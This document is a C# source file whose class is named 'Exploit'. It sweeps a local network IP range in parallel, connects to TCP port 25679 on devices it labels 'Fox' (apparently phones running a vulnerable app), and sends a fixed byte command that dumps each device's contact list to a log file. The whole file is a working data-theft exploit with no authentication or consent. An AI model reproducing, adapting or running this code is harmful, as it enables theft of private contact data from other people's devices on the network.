using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

namespace LookugA
{
    class Exploit
    {
        private List<string> GetIpAdressFromRange(string fromIp, string toIp)
        {
            var ips = new List<string>();
            IPAddress tmpIP = null;
            if (IPAddress.TryParse(fromIp, out tmpIP) == true && IPAddress.TryParse(toIp, out tmpIP) == true)
            {
                string[] fromOct = fromIp.Split('.');
                string[] toOct = toIp.Split('.');
                string a = null, b = null, c = null, d = null;
                int startA = Convert.ToInt32(fromOct[0]);
                int startB = Convert.ToInt32(fromOct[1]);
                int startC = 1;
                int startD = 1;
                int endA = Convert.ToInt32(toOct[0]);
                int endB = 255;
                int endC = 255;
                int endD = 255;
                for (int intA = startA; intA <= endA; intA++)
                {
                    a = intA.ToString();
                    startB = intA == Convert.ToInt32(fromOct[0]) ? Convert.ToInt32(fromOct[1]) : 1;
                    endB = intA == Convert.ToInt32(toOct[0]) ? Convert.ToInt32(toOct[1]) : 255;
                    for (int intB = startB; intB <= endB; intB++)
                    {
                        b = intB.ToString();
                        startC = (intA == Convert.ToInt32(fromOct[0])) && (intB == Convert.ToInt32(fromOct[1])) ? Convert.ToInt32(fromOct[2]) : 1;
                        endC = (intA == Convert.ToInt32(toOct[0])) && (intB == Convert.ToInt32(toOct[1])) ? Convert.ToInt32(toOct[2]) : 255;
                        for (int intC = startC; intC <= endC; intC++)
                        {
                            c = intC.ToString();
                            startD = (intA == Convert.ToInt32(fromOct[0])) && (intB == Convert.ToInt32(fromOct[1])) && (intC == Convert.ToInt32(fromOct[2])) ? Convert.ToInt32(fromOct[3]) : 1;
                            endD = (intA == Convert.ToInt32(toOct[0])) && (intB == Convert.ToInt32(toOct[1])) && (intC == Convert.ToInt32(toOct[2])) ? Convert.ToInt32(toOct[3]) : 255;
                            for (int intD = startD; intD <= endD; intD++)
                            {
                                d = intD.ToString();
                                ips.Add(a + "." + b + "." + c + "." + d);
                            }
                        }
                    }
                }
            } return ips;
        }

        public void Scan()
        {
            String strHostName = Dns.GetHostName();
            IPHostEntry iphostentry = Dns.GetHostEntry(strHostName);
            var tx = iphostentry.AddressList.Where(fn => !IPAddress.IsLoopback(fn) && fn.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork);

            Console.WriteLine("The following IP Addresses are assigned to this machine: ");
            tx.All(fn => { Console.WriteLine(fn); return true; });

            Console.WriteLine();
            Console.WriteLine("Which LAN IP range would you like to scan on?");
            Console.WriteLine("(default if empty: 192.168.0.1 -> 192.168.0.255)");
            Console.WriteLine("IP Address From: ");
            var ipFrom = Console.ReadLine();
            ipFrom = (ipFrom == "" ? "192.168.0.1" : ipFrom);
            Console.WriteLine("IP Address To: ");
            var ipTo = Console.ReadLine();
            ipTo = (ipTo == "" ? "192.168.0.255" : ipTo);

            var ips = GetIpAdressFromRange(ipFrom, ipTo);

            Console.WriteLine("Locater Started...");
            Console.WriteLine();
            Console.Write("Looking for A Fox...");

            Parallel.ForEach(ips, new ParallelOptions { MaxDegreeOfParallelism = 999 }, (i) =>
            {
                ConnectTAP(i);
            });

        }

        //Object lockme = new Object();
        public bool ConnectTAP(string host)
        {
            Console.Title = host + " is being looked @ - LookugA";

            //lock (lockme)
            //{
            //    //Console.SetCursorPosition(0, Console.CursorTop);
            //    //Console.Write("Looking for Fox on " + host);
            //}
            using (var tcp = new TcpClient())
            {
                try
                {
                    tcp.ConnectAsync(host, 25679).Wait(500);
                    NetworkStream stream = tcp.GetStream();
                    Transfer(stream, new byte[] { });

                    Console.WriteLine();
                    Console.WriteLine("A Fox Located @ " + host);
                    //just as a buffer for empty respone the phone returns first.
                    var contactsFileName = host + ".contacts_"+ DateTime.Now.ToString("mmss") + ".log";

                    Console.WriteLine();
                    Console.WriteLine("Starting Contacts Dumping: " + contactsFileName);
                    var result = (Transfer(stream, new byte[] { 03, 00, 00, 00, 02, 00, 00, 00, 03, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 }).Substring(2)); // skip first 2 chars for valid json string object;
                    System.IO.File.WriteAllText(contactsFileName, result);
                    Console.WriteLine("Finished Contacts Dumping: " + contactsFileName);

                }
                catch
                {
                }

                return tcp.Connected;
            }
        }

        string Transfer(NetworkStream stream, byte[] content)
        {
            stream.Write(content, 0, content.Length);

            var data = new Byte[256];

            String responseData = "";

            Int32 bytes = stream.Read(data, 0, data.Length);
            responseData += System.Text.Encoding.ASCII.GetString(data, 0, bytes);

            while (stream.DataAvailable)
            {
                System.Threading.Thread.Sleep(100);
                bytes = stream.Read(data, 0, data.Length);
                responseData += System.Text.Encoding.ASCII.GetString(data, 0, bytes);
            }

            var output = new string(responseData.Where(c => !char.IsControl(c)).ToArray());
            return output;
        }
    }
}
